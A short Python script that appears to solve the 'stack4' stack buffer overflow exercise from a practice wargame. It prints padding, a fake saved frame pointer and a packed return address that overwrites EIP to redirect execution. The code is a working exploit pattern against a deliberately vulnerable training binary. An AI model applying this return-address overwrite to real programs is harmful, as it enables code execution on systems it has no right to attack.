#!/usr/bin/env python

import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
ebp = "AAAA"
eip = struct.pack("I", 0x080483f4)

print(padding + ebp + eip)

# OUT:
"""
# python /tmp/stack4_overwrite.py > /tmp/exp
# base64:
"""
# padding += "\x24\x84\x04\x08" # 0x08048424